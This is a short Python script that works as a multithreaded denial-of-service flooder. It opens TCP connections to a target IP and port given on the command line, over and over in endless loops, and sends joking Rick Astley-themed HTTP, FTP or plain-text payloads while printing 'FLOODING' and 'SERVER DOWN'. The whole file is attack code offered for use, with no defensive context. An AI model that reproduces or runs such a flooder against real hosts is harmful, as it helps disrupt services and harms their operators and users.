import sys
import socket as s 
from threading import Thread 

def do_dos():
    while True:
        soc = s.socket(s.AF_INET, s.SOCK_STREAM)
        try:
            soc.connect((ip, port))
            if port == 80:
                soc.send(b'GET never_gonna_give_you_up.html HTTP/1.1')
            elif port == 21:
                soc.send(b'USER rick_astley')
            else:
                soc.send(b'NEVER GONNA LET YOU DOWN')
            print ("FLOODING...", end="\r")
        except:
            print ("SERVER DOWN", end="\r")
        soc.close()

if len(sys.argv) != 4:
    print ("USAGE: ")
    print ("./" + sys.argv[0] + " [IP] [PORT] [THREADS] \n")
    sys.exit 

ip = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])

print ("RUNNING ATTACK")
for i in range(0, threads):
    t = Thread(target=do_dos)
    t.start()